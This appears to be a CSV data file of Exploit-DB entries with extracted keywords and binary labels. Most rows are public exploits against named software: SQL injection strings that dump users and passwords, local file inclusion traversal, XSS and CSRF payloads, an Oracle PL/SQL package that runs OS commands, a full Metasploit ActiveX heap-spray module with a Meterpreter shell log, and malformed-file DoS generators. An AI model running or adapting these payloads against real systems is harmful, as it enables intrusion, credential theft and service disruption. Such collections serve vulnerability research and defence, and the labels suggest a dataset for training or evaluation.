45285,"ipPulse 1.92 - 'TCP Port' Denial of Service (PoC) # Exploit Title: ipPulse 1.92 - 'TCP Port' Denial of Service (PoC) # Discovery by: Diego Santamaria # Discovery Date: 2018-08-28 # Vendor Homepage: https://www.netscantools.com/ippulseinfo.html # Software Link: http://download.netscantools.com/ipls192.zip # Tested Version: 1.92 # Vulnerability Type: Denial of Service (DoS) Local # Tested on OS: Windows 7 Professional   # Steps to Reproduce:   # 1. Run the python code TCP_port.py  # 2. Open TCP_exploit.txt and copy the content  # 3. Open ipPulse.exe  # 4. Choose 'Target Editor'  # 5. write '1' in 'IP Adreess' # 6. Paste the content from exploit.txt on 'TCP Port' # 7. Press 'Add Above Fields to Target List' # 8. Press ok and Crashed   #!/usr/bin/env python  content = ""\x41"" * 4087 f = open (""TCP_exploit.txt"", ""w"") f.write(content) f.close()","[""'TCP Port'"", ""Port'""]",1
48587,"SOS JobScheduler 1.13.3 - Stored Password Decryption # Exploit Title: SOS JobScheduler 1.13.3 - Stored Password Decryption # Google Dork: N/A # Date: 2020-04-20 # Exploit Author: Sander Ubink # Vendor Homepage: www.sos-berlin.com # Software Link: www.sos-berlin.com/en/jobscheduler-downloads # Version: Tested on 1.12.9 and 1.13.3, vendor reported 1.12 and 1.13 # Tested on: Windows and Linux # CVE: CVE-2020-12712  # Description: SOS JobScheduler is a tool for remote system administration that allows users to call maintenance scripts via a web interface.  # The tool places the maintenance scripts on the remote systems by means of (S)FTP. It allows the user to save profiles for these connections,  # in which the password for the (S)FTP connection is optionally stored. When the user chooses to store the password with the profile,  # it is encrypted using the name of the profile as the encryption key. Since the name of the profile is stored in the same configuration file,  # the plaintext (S)FTP password can trivially be recovered. The encryption algorithm used is Triple DES (3DES) with three keys, requiring a key  # length of 24 bytes. The profile name is padded to this length to create the key. Finally, the encrypted password gets base64 encoded before  # being stored in the configuration file.  # Usage: python jobscheduler-decrypt.py [encrypted password in base64] [profile name]  import pyDes import base64 import argparse  parser = argparse.ArgumentParser(description=""Decrypt the password stored in a Jobscheduler (S)FTP profile configuration file"") parser.add_argument(""password"", help=""password to be decrypted"") parser.add_argument(""profilename"", help=""name of the profile"") args = parser.parse_args()  if len(args.profilename) > 24: 	sys.exit(""Profile name is longer than 24 characters. Check the validity of the input."")  key = args.profilename + ((24 - len(args.profilename)) * "" "") cipher = pyDes.triple_des(key, pyDes.ECB, b""\0\0\0\0\0\0\0\0"", pad="" "", padmode=None) plain = cipher.decrypt(base64.b64decode(args.password))  print(plain)",['(S)FTP'],1
40068,"OPAC KpwinSQL - Multiple Vulnerabilities OPAC KpwinSQL LFI/XSS Vulnerabilities  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Product Website	: http://www.kpsys.cz/ Affected version: All -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-   Description:  KpwinSQL suffers from an unauthenticated file inclusion vulnerability (LFI) when input passed thru the 'lang' parameter to the following scripts which are not properly verified: 	+ index.php 	+ help.php 	+ logpin.php 	+ brow.php 	+ indexs.php 	+ search.php 	+ hledani.php 	+ hled_hesl.php before being used to include files. This can be exploited to include files from local resources with their absolute path and with directory traversal attacks.  Moreover, KpwinSQL system suffers from Cross Site Scripting vulnerability when input passed thru the 'vyhl' parameter to 'index.php' script which does not perform input validation.  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Tested on: Apache/2.2.11 (Win32)            PHP/5.2.9-2 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Vulnerabilities discovered by Yakir Wizman                               https://www.linkedin.com/in/yakirwizman Date: 06.07.2016 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Proof Of Concept:  Local File Inclusion example: http://server/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00  Cross Site Scripting example: http://server/index.php?vyhl='><script>alert('XSS')</script>&lang=cze","[""index.php'""]",1
20213,"AIX 4.2/4.3 - netstat -Z Statistic Clearing source: https://www.securityfocus.com/bid/1660/info  A vulnerability exists in versions 4.x. x of AIX, from IBM. Any local user can utilize the -Z command to netstat, without needing to be root. This will cause interface statistics to be reset. This could potentially interfere with programs that track statistical information.  $ netstat -in --> shows stats $ netstat -Zi --> clears them without checking the uid",['netstat'],1
43240,"FS Thumbtack Clone 1.0 - 'cat' / 'sc' SQL Injection # # # # #  # Exploit Title: FS Thumbtack Clone 1.0 - SQL Injection # Dork: N/A # Date: 08.12.2017 # Vendor Homepage: https://fortunescripts.com/ # Software Link: https://fortunescripts.com/product/thumbtack-clone/ # Demo: http://thumbtack-clone.demonstration.co.in/ # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # # Description: # The vulnerability allows an attacker to inject sql commands.... #  # Proof of Concept:  #  # 1) # http://localhost/[PATH]/browse-category.php?cat=[SQL] #  # -91a87ff679a2f3e71d9181a67b7542122c'++/*!22222UNION*/(/*!22222SELECT*/(1),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(3),(4))--+- #  # http://server/browse-category.php?cat=-91a87ff679a2f3e71d9181a67b7542122c'++/*!22222UNION*/(/*!22222SELECT*/(1),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(3),(4))--+- #  #  # 2) # http://localhost/[PATH]/browse-scategory.php?sc=[SQL] #  # -34202cb962ac59075b964b07152d234b70'++/*!22222UNION*/+/*!22222SELECT*/+1,2,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),4,5,6,7,8,9--+- #  # http://server/browse-scategory.php?sc=-34202cb962ac59075b964b07152d234b70'++/*!22222UNION*/+/*!22222SELECT*/+1,2,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),4,5,6,7,8,9--+- #  # # # # #","[""'cat'"", ""'sc'""]",1
4699,"firefly media server (mt-daapd) 2.4.1 / svn 1699 - Multiple Vulnerabilities #######################################################################                               Luigi Auriemma  Application:  Firefly Media Server (mt-daapd)               http://www.fireflymediaserver.org Versions:     <= 2.4.1 and SVN <= 1699 Platforms:    *nix, Windows, Mac and others Bugs:         A] partial directory traversal on Windows               B] authentication bypass on Windows               C] duplicated HTTP parameter Denial of Service               D] CPU at 100% with partial queries Exploitation: remote Date:         03 Dec 2007 Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org   #######################################################################   1) Introduction 2) Bugs 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   Firefly Media Server (aka mt-daapd) is an open source server for the DAAP protocol used by Roku SoundBridge and iTunes.   #######################################################################  ======= 2) Bugs =======  ----------------------------------------- A] partial directory traversal on Windows -----------------------------------------  Using 3 dots in the HTTP query is possible to get a specific file in the parent directory of the Firefly admin-root folder. That means that an attacker can download the mt-daapd.conf file which contains all the configuration of the server or other files like firefly.log and so on.  If the server is protected by password is enough to use the bug B below which allows any external unauthenticated attacker to download these files (in short GET /.../mt-daapd.conf works only if no password is set, otherwise you must use GET .../mt-daapd.conf or the other methods explained there).  In my tests was possible to go down only of one directory, that's why I consider it ""partial"".  This problem is exploitable only versus Windows servers.   ----------------------------------- B] authentication bypass on Windows -----------------------------------  The usage of a dot '.' or a backslash '\' before the URI (at the place of the usual /) or just nothing (GET file.txt HTTP/1.0) allows any unauthenticated attacker to download the files from the admin-root folder in case the server is protected by password. Although the admin-root folder doesn't contain sensitive informations it can become very dangerous if used with bug A as written above.  Note that the trick works only for the ""real"" files and not for the special ones like xml-rpc and the DAAP commands.  This problem is exploitable only versus Windows servers.   ---------------------------------------------- C] duplicated HTTP parameter Denial of Service ----------------------------------------------  It's possible to terminate the server remotely simply using two or more HTTP parameters with the same name (like two Host or User-Agent or just any other string).   ----------------------------------- D] CPU at 100% with partial queries -----------------------------------  Not really dangerous as the above bugs anyway the server's CPU goes to 100% while receiving the queries, which means that anyone can just connect to it sending only the first line (GET / HTTP/1.0) to cause this effect which will continue forever also when the attacker disconnects from it.   #######################################################################  =========== 3) The Code ===========   Example queries to send with netcat:    http://aluigi.org/poc/fireflyz.zip   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/4699.zip (2007-fireflyz.zip)  nc localhost 9999 -v -v < file.txt   #######################################################################  ====== 4) Fix ======   The bugs will be fixed in the next versions.   #######################################################################   ---  Luigi Auriemma http://aluigi.org  # milw0rm.com [2007-12-07]",['mt-daapd.conf'],1
24353,"Oracle 9i - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/10871/info  Reportedly, multiple unspecified Oracle products contain multiple unspecified vulnerabilities.   The reported vulnerabilities include SQL-injection issues, buffer-overflow issues, and others.   There have also been reports that issues covered in this BID and resolved in the referenced Oracle patch include trigger-abuse issues, character-set-conversion bugs, and denial-of-service vulnerabilities. More information is pending.   Note that a number of unsupported versions of affected products may also potentially be vulnerable.  -- -- $Id: raptor_oraextproc.sql,v 1.1 2006/12/19 14:21:00 raptor Exp $ -- -- raptor_oraextproc.sql - command exec via oracle extproc -- Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info> -- -- Directory traversal vulnerability in extproc in Oracle 9i and 10g  -- allows remote attackers to access arbitrary libraries outside of the  -- $ORACLE_HOME\bin directory (CVE-2004-1364). -- -- This PL/SQL code exploits the Oracle extproc directory traversal bug -- to remotely execute arbitrary OS commands with the privileges of the DBMS  -- user (the CREATE [ANY] LIBRARY privilege is needed). -- -- See also:  -- http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql -- http://www.0xdeadbeef.info/exploits/raptor_orafile.sql -- -- Vulnerable platforms: -- Oracle 9i (all versions?) -- Oracle 10g versions prior to 10.1.0.3 -- -- Tested on Oracle9i Enterprise Edition Release 9.2.0.1.0 - 64bit Production, -- running on both Solaris 9 and 10 systems. It will need some tweakings to  -- properly work on other platforms. -- -- Usage example: -- $ echo $ORACLE_HOME -- /opt/oracle/ -- $ sqlplus ""/ as sysdba"" -- [...] -- Connected to: -- Oracle9i Enterprise Edition Release 9.2.0.1.0 - 64bit Production -- With the Partitioning, OLAP and Oracle Data Mining options -- JServer Release 9.2.0.1.0 - Production -- SQL> @raptor_oraextproc.sql -- [...] -- exec oracmd32.exec('touch /tmp/32'); -- [...] -- ERROR at line 1: -- ORA-06520: PL/SQL: Error loading external library -- ORA-06522: ld.so.1: extprocPLSExtProc: fatal: -- /opt/oracle/bin/../../../../../../../lib/32/libc.so.1: wrong ELF class: -- ELFCLASS32 -- [...] -- SQL> exec oracmd64.exec('touch /tmp/64'); -- SQL> !ls -l /tmp/64 -- -rw-r--r--   1 oracle   orainst        0 Dec 19 13:49 /tmp/64 --  -- library for 32-bit oracle releases create or replace library exec_shell32 as '$ORACLE_HOME/bin/../../../../../../../lib/32/libc.so.1'; /  -- library for 64-bit oracle releases create or replace library exec_shell64 as '$ORACLE_HOME/bin/../../../../../../../lib/64/libc.so.1'; /  -- package for 32-bit oracle releases -- usage: exec oracmd32.exec('command'); create or replace package oracmd32 as 	procedure exec(cmdstring in char); end oracmd32; / create or replace package body oracmd32 as 	procedure exec(cmdstring in char) 	is external 	name ""system"" 	library exec_shell32 	language c; end oracmd32; /  -- package for 64-bit oracle releases -- usage: exec oracmd64.exec('command'); create or replace package oracmd64 as 	procedure exec(cmdstring in char); end oracmd64; / create or replace package body oracmd64 as 	procedure exec(cmdstring in char) 	is external 	name ""system"" 	library exec_shell64 	language c; end oracmd64; /  -- milw0rm.com [2006-12-19]",['directory'],0
4496,Joomla! Component Flash Image Gallery - Remote File Inclusion ============================================ =                                          = =             XORON  (c) 2007              = =                                          = ============================================ =                                          = =Joomla com_wmtgallery Remote File Include   =                                          = ============================================ = = Download: = = http://www.webmaster-tips.net = ============================================ = = Exploit: = /administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=shell? = ============================================ =                                          = =Tum islam aleminin ramazan bayrami mubarek olsn = =                                          = ============================================   # milw0rm.com [2007-10-07],['com_wmtgallery'],1
6455,"Linkarity - 'link.php' SQL Injection ================================================================================   Linkarity (link.php) Remote SQL Injection Vulnerability    ================================================================================    Discovered By: Egypt Coder  home : WWW.Sec-Area.com  Mail: Egyptcoder@hotmail.com    Dork:  Powered by: Linkarityâ„¢   Exploit :  http://localhost/link.php?cat_id=-1+union+select+1,2,3,4,5,6,7,8,version(),version(),11,12,13,14,15,16,17,18    Greets : ProViDoR , rUnViruS, Error Code, H666p , Fear Master , Broken Security  # milw0rm.com [2008-09-13]","[""'link.php'""]",1
38616,"Python 2.7 - 'array.fromstring' Method Use-After-Free Title: Python 2.7 array.fromstring Use After Free Credit: John Leitch (john@autosectools.com) Url1: http://autosectools.com/Page/Python-array-fromstring-Use-After-Free Url2: http://bugs.python.org/issue24613 Resolution: Fixed  The Python 2.7 array.fromstring() method suffers from a use after free caused by unsafe realloc use. The issue is triggered when an array is concatenated to itself via fromstring() call:  static PyObject * array_fromstring(arrayobject *self, PyObject *args) {     char *str;     Py_ssize_t n;     int itemsize = self->ob_descr->itemsize;     if (!PyArg_ParseTuple(args, ""s#:fromstring"", &str, &n)) <<<< The str buffer is parsed from args. In cases where an array is passed to itself, self->ob_item == str.         return NULL;     if (n % itemsize != 0) {         PyErr_SetString(PyExc_ValueError,                    ""string length not a multiple of item size"");         return NULL;     }     n = n / itemsize;     if (n > 0) {         char *item = self->ob_item; <<<< If str == self->ob_item, item == str.         if ((n > PY_SSIZE_T_MAX - Py_SIZE(self)) ||             ((Py_SIZE(self) + n) > PY_SSIZE_T_MAX / itemsize)) {                 return PyErr_NoMemory();         }         PyMem_RESIZE(item, char, (Py_SIZE(self) + n) * itemsize); <<<< A realloc call occurs here with item passed as the ptr argument. Because realloc sometimes calls free(), this means that item may be freed. If item was equal to str, str is now pointing to freed memory.         if (item == NULL) {             PyErr_NoMemory();             return NULL;         }         self->ob_item = item;         Py_SIZE(self) += n;         self->allocated = Py_SIZE(self);         memcpy(item + (Py_SIZE(self) - n) * itemsize,                str, itemsize*n); <<<< If str is dangling at this point, a use after free occurs here.     }     Py_INCREF(Py_None);     return Py_None; }  In most cases when this occurs, the function behaves as expected; while the dangling str pointer is technically pointing to deallocated memory, given the timing it is highly likely the memory contains the expected data. However, ocassionally, an errant allocation will occur between the realloc and memcpy, leading to unexpected contents in the str buffer.  In applications that expose otherwise innocuous indirect object control of arrays as attack surface, it may be possible for an attacker to trigger the corruption of arrays. This could potentially be exploited to exfiltrate data or achieve privilege escalation, depending on subsequent operations performed using corrupted arrays.  A proof-of-concept follows:  import array import sys import random  testNumber = 0  def dump(value):     global testNumber     i = 0     for x in value:         y = ord(x)         if (y != 0x41):              end = ''.join(value[i:]).index('A' * 0x10)             sys.stdout.write(""%08x a[%08x]: "" % (testNumber, i))             for z in value[i:i+end]: sys.stdout.write(hex(ord(z))[2:])             sys.stdout.write('\r\n')             break                     i += 1  def copyArray():     global testNumber     while True:         a=array.array(""c"",'A'*random.randint(0x0, 0x10000))         a.fromstring(a)         dump(a)         testNumber += 1      print ""Starting...""     copyArray()  The script repeatedly creates randomly sized arrays filled with 0x41, then calls fromstring() and checks the array for corruption. If any is found, the relevant bytes are written to the console as hex. The output should look something like this:  Starting... 00000007 a[00000cdc]: c8684d0b0f54c0 0000001d a[0000f84d]: b03f4f0b8be620 00000027 a[0000119f]: 50724d0b0f54c0 0000004c a[00000e53]: b86b4d0b0f54c0 0000005a a[000001e1]: d8ab4609040620 00000090 a[0000015b]: 9040620104e5f0 0000014d a[000002d6]: 10ec620d8ab460 00000153 a[000000f7]: 9040620104e5f0 0000023c a[00000186]: 50d34c0f8b65a0 00000279 a[000001c3]: d8ab4609040620 000002ee a[00000133]: 9040620104e5f0 000002ff a[00000154]: 9040620104e5f0 0000030f a[00000278]: 10ec620d8ab460 00000368 a[00000181]: 50d34c0f8b65a0 000003b2 a[0000005a]: d0de5f0d05e5f0 000003b5 a[0000021c]: b854d00d3620 00000431 a[000001d8]: d8ab4609040620 0000044b a[000002db]: 10ec620d8ab460 00000461 a[000000de]: 9040620104e5f0 000004fb a[0000232f]: 10f74d0c0ce620 00000510 a[0000014a]: 9040620104e5f0  In some applications, such as those that are web-based, similar circumstances may manifest that would allow for remote exploitation.  To fix the issue, array_fromstring should check if self->ob_item is pointing to the same memory as str, and handle the copy accordingly.","[""'array.fromstring'""]",1
15658,"Viscom Image Viewer CP Gold 5.5 - 'Image2PDF()' Remote Buffer Overflow (Metasploit) # Image Viewer CP gold v5.5 Buffer Overflow # Found by: bz1p (AT) bshellz.net  # Impact: Low, NOT marked safe for scripting or initializing # CVE: ? (0day)  #  # msf exploit(image_viewer_cpgold) >  # [*] Sending exploit to 172.17.120.211:1061... # [*] Sending stage (749056 bytes) to 172.17.120.211 # [*] Meterpreter session 1 opened (172.17.120.235:4443 -> 172.17.120.211:1064) at 2010-11-15 18:11:32 +1100 # # msf exploit(image_viewer_cpgold) > sessions -l # # Active sessions # =============== #  #   Id  Type                   Information            Connection #   --  ----                   -----------            ---------- #   1   meterpreter x86/win32  VICTIMXP\victim @ VICTIM  172.17.120.235:4443 -> 172.17.120.211:1064 #  # msf exploit(image_viewer_cpgold) > sessions -i 1 # [*] Starting interaction with 1... #  # meterpreter > shell # Process 3536 created. # Channel 1 created. # Microsoft Windows XP [Version 5.1.2600] # (C) Copyright 1985-2001 Microsoft Corp. # # C:\Documents and Settings\victim\Desktop>  ################################### Start ###################################  ## # $Id: image_viewer_cpgold.rb 10429 2010-12-03 18:46:29Z bz1p $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Image Viewer CP Gold ActiveX Control Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in NImage Viewer CP Gold ActiveX Control 5.5. When 				sending an overly long string to the Image2PDF() property of ImageViewer2.ocx  				an attacker may be able to execute arbitrary code. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'bz1p (0xbz1p[<AT>]gmail.com)' ], 			'Version'        => '$Revision: 10429 $', 			'References'     => 				[ 					[ 'CVE', '-' ], 					[ 'OSVDB', '-'], 					[ 'BID', '-' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'         => 1024, 					'BadChars'      => ""\x00\x03\x04\x05\x06"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ] 				], 			'DiscoveryDate' => 'Oct 15 2010', 			'DisclosureDate' => 'Dec 2 2010', 			'DefaultTarget'  => 0)) 	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request) 		# Re-generate the payload. 		return if ((p = regenerate_payload(cli)) == nil)  		# Encode the shellcode. 		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))  		# Create some nops. 		nops    = Rex::Text.to_unescape(make_nops(4))  		# Set the return. 		ret     = Rex::Text.uri_encode([target.ret].pack('L'))  		# Randomize the javascript variable names. 		vname  = rand_text_alpha(rand(100) + 1) 		var_i  = rand_text_alpha(rand(30)  + 2) 		rand1  = rand_text_alpha(rand(100) + 1) 		rand2  = rand_text_alpha(rand(100) + 1) 		rand3  = rand_text_alpha(rand(100) + 1) 		rand4  = rand_text_alpha(rand(100) + 1) 		rand5  = rand_text_alpha(rand(100) + 1) 		rand6  = rand_text_alpha(rand(100) + 1) 		rand7  = rand_text_alpha(rand(100) + 1) 		rand8  = rand_text_alpha(rand(100) + 1)  		content = %Q| 			<html> 			<object id='#{vname}' classid='clsid:E589DA78-AD4C-4FC5-B6B9-9E47B110679E'></object> 			<script language=""JavaScript""> 			var #{rand1} = unescape('#{shellcode}'); 			var #{rand2} = unescape('#{nops}'); 			var #{rand3} = 20; 			var #{rand4} = #{rand3} + #{rand1}.length; 			while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2}; 			var #{rand5} = #{rand2}.substring(0,#{rand4}); 			var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4}); 			while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5}; 			var #{rand7} = new Array(); 			for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} } 			var #{rand8} = """" 			for (#{var_i} = 0; #{var_i} < 8500; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') } 			#{vname}.Image2PDF(""lolznoaslrdepbypass"", #{rand8}); 			</script> 			</html> 			|  		content = Rex::Text.randomize_space(content)  		print_status(""Sending exploit to #{cli.peerhost}:#{cli.peerport}..."")  		# Transmit the response to the client 		send_response_html(cli, content)  		# Handle the payload 		handler(cli) 	end  end","[""'Image2PDF()'""]",1
28613,RedBLoG 0.5 - 'common.php?root_path' Remote File Inclusion source: https://www.securityfocus.com/bid/20115/info    The redblog application is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.    Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/Path/common.php?root_path=http://www.example.com,"[""'common.php?root_path'""]",1
1343,"Microsoft Windows Metafile - 'gdi32.dll' Denial of Service (MS05-053) /*  * Author: Winny Thomas  *	   Pune, INDIA  *  * The crafted metafile from this code when viewed in internet explorer raises the CPU utilization   * to 100%. The code was tested on Windows 2000 server SP4. The issue does not occur with the   * hotfix for GDI (MS05-053) installed  *  * Disclaimer: This code is for educational/testing purposes by authosized persons on   * networks/systems setup for such a purpose.The author of this code shall not bear   * any responsibility for any damage caused by using this code.  *  */  #include <stdio.h>  unsigned char wmfheader[] =  ""\xd7\xcd\xc6\x9a\x00\x00\xc6\xfb\xca\x02\xaa\x02\x39\x09\xe8\x03"" ""\x00\x00\x00\x00\x66\xa6"" ""\x01\x00"" ""\x09\x00"" ""\x00\x03"" ""\xff\xff\xff\xff"" //Metafile file size ""\x04\x00"" ""\xff\xff\xff\xff"" //Largest record size ""\x00\x00"";  unsigned char MetafileRECORD[] =  ""\x05\x00\x00\x00\x0b\x02\x39\x09\xc6\xfb\x08\x00\x00\x00\xfa\x02"" ""\x05\x00\x00\x00\x00\x00\xff\xff\xff\x00\x04\x00\x00\x00\x2d\x01"" ""\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x04\x00\x00\x00\x2d\x01"" ""\x02\x00\x07\x00\x00\x00\xfc\x02\x00\x00\xff\xff\xff\x00\x00\x00"" ""\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\x2d\x01\x02\x00"" ""\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01\x00\x00"" ""\x07\x00\x00\x00\xfc\x02\x00\x00\xfa\x94\x93\x00\x00\x00\x04\x00"" ""\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00\x04\x00"" ""\x00\x00\x06\x01\x01\x00\x14\x00\x00\x00\x24\x03\x08\x00\xc6\xfb"" ""\x9b\x03\xbc\xfe\x9b\x03\x0f\x01\x1a\x07\xa5\x02\x1a\x07\xf4\x00"" ""\x39\x09\xd5\xfc\x36\x07\x86\xfe\x36\x07\xc6\xfb\x9b\x03"";  unsigned char wmfeof[] =  ""\x00\x00\x00\x00"";  int main(int argc, char *argv[]) { 	FILE *fp; 	char wmfbuf[1024]; 	int metafilesize, metafilesizeW, i, j; 	 	metafilesize = sizeof (wmfheader) + sizeof (MetafileRECORD) + sizeof(wmfeof) -3; 	metafilesizeW = metafilesize/2; 	memcpy((unsigned long *)&wmfheader[28], &metafilesizeW, 4);  	printf(""[*] Adding Metafile header\n""); 	for (i = 0; i < sizeof(wmfheader) -1; i++) { 		(unsigned char)wmfbuf[i] = (unsigned char)wmfheader[i]; 	} 			 	printf(""[*] Adding Metafile records\n""); 	for (j = i, i = 0; i < sizeof(MetafileRECORD) -1; i++, j++) { 		wmfbuf[j] = MetafileRECORD[i]; 	} 	 	printf(""[*] Adding EOF record\n""); 	for (i = 0; i < sizeof(wmfeof) -1; i++, j++) { 		wmfbuf[j] = wmfeof[i]; 	}  	printf(""[*] Creating Metafile (MS053.wmf)\n""); 	fp = fopen(""MS053.wmf"", ""wb""); 	fwrite(wmfbuf, 1, metafilesize, fp); 	fclose(fp); }  // milw0rm.com [2005-11-29]","[""'gdi32.dll'""]",1
6228,"OpenImpro 1.1 - 'image.php' SQL Injection #OpenImpro 1.1(id) Sql Injection Vulnerability    #Author: nuclear    #script: http://downloads.sourceforge.net/openimpro/openimpro-1.1.zip    #exploit: target.com/image.php?id=-1 union select 1,2,concat(firstname,0x3a,lastname,0x3a,password),4,5,6 from im_person --   #Description: when you do the injection you will be asked to download a file called image.php . Save it,open with any texteditor and get your password ;).   #greetz cAs, Mi4night, zYzTeM, THE_MAN, Pepe, I-O-W-A, Digitalfortress, DiGitalX, sys32-hack, sys32r, and me :P  # milw0rm.com [2008-08-10]","[""'image.php'""]",1
39402,"eClinicalWorks (CCMR) - Multiple Vulnerabilities # Title: eClinicalWorks (CCMR) - Multiple Vulnerabilities # Vendor: https://www.eclinicalworks.com # Product: eClinicalWorks Population Health (CCMR) Client Portal Software  # URL: https://www.eclinicalworks.com/products-services/population-health-ccmr/ # Credit: Jerold Hoong  -------------------------------------  # CVE-2015-4591 CROSS-SITE SCRIPTING Cross-site scripting (XSS) vulnerability in login.jsp in eClinicalWorks Population Health (CCMR) Client Portal Software allows remote authenticated users to inject arbitrary javascript via the strMessage parameter.  https://127.0.0.1/mobiledoc/jsp/ccmr/clientPortal/login.jsp?strMessage= %3Cimg%20src=/%20onerror=%22alert%28document.cookie%29%22/%3E  -------------------------------------  # CVE-2015-4592 SQL INJECTION SQL injection vulnerability in portalUserService.jsp in eClinicalWorks Population Health (CCMR) Client Portal Software allows remote authenticated users to inject arbitrary malicious database commands as part of user input.  Parameter: uemail (POST PARAMETER) Type: stacked queries Title: Microsoft SQL Server/Sybase stacked queries (comment) Payload: action=updatePersonalInfo&ufname=john&ulname=doe&upaddress=&upcity=&upstate= &zipcode=&uemail=john.doe@test.com';WAITFOR DELAY '0:0:5'--&upphone=0&umobileno=  POST /mobiledoc/jsp/ccmr/clientPortal/admin/service/portalUserService.jsp HTTP/1.1 Host: 127.0.0.1:443 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: https://127.0.0.1/mobiledoc/jsp/ccmr/clientPortal/dashBoard.jsp Content-Length: 186 [SNIP] ... Connection: keep-alive Pragma: no-cache Cache-Control: no-cache [SNIP] ...  action=updatePersonalInfo&ufname=john&ulname=doe&upaddress=&upcity=&upstate= &zipcode=&uemail=john.doe@test.com';WAITFOR DELAY '0:0:5'--&upphone=0&umobileno=  -------------------------------------  # CVE-2015-4593 CROSS-SITE REQUEST FORGERY Cross-site request forgery (CSRF) vulnerability in portalUserService.jsp in eClinicalWorks  Client Portal allows remote attackers to hijack the authentication of content administrators for requests that could lead to the creation, modification and deletion of users, appointments and employees.  # ADDING OF USER <html>   <body>     <form action=""https://127.0.0.1/mobiledoc/jsp/ccmr/clientPortal/admin/service/portalUserService.jsp"" method=""POST"">       <input type=""hidden"" name=""action"" value=""add"" />       <input type=""hidden"" name=""uid"" value=""0"" />       <input type=""hidden"" name=""createdOver"" value=""1"" />       <input type=""hidden"" name=""ufname"" value=""John"" />       <input type=""hidden"" name=""ulname"" value=""Doe"" />       <input type=""hidden"" name=""uminitial"" value="""" />       <input type=""hidden"" name=""selUserType"" value=""1"" />       <input type=""hidden"" name=""status"" value=""0"" />       <input type=""hidden"" name=""upaddress"" value="""" />       <input type=""hidden"" name=""upcity"" value="""" />       <input type=""hidden"" name=""upstate"" value="""" />       <input type=""hidden"" name=""zipcode"" value="""" />       <input type=""hidden"" name=""uemail"" value=""johndoe@test.com.de"" />       <input type=""hidden"" name=""upphone"" value=""98999299"" />       <input type=""hidden"" name=""umobileno"" value="""" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>  -------------------------------------  # CVE-2015-4594 SESSION FIXATION The web application is vulnerable to session fixation attacks. When authenticating a user the application does not assign a new session ID, making it possible to use an existent session ID.  -------------------------------------  # TIMELINE – 16/06/2015: Vulnerability found – 16/06/2015: Vendor informed – 16/06/2015: Request for CVE IDs - 16/06/2015: MITRE issued CVE numbers – 16/06/2015: Vendor responded requesting more information on support contract etc - 21/06/2015: No support contract, vendor does not open case - 22/06/2015: Requested update from vendor, no response - 01/07/2015: Contacted vendor again, vendor requested for support contract again - 02/07/2015: No support contract, no response from vendor – 31/01/2016: Public disclosure",['portalUserService.jsp'],1
